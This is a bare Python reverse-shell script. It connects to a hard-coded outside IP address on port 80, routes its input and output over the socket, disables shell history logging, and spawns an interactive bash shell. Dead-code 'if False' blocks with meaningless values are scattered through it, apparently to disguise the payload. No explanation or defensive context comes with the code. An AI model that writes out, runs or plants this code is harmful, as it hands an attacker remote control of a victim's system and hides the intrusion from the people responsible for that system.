import pty
import os
lhost = '3.228.3.164'
import socket
lport = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv('HISTFILE', '/dev/null')
pty.spawn('/bin/bash')
if False:
    _var_146_0 = (586, 397, 535)
    _var_146_1 = (349, 926, 198)
    _var_146_2 = (128, 220, 205)

    def _var_146_fn():
        pass
s.close()
if False:
    _var_147_0 = (759, 913, 598)
    _var_147_1 = (89, 171, 552)

    def _var_147_fn():
        pass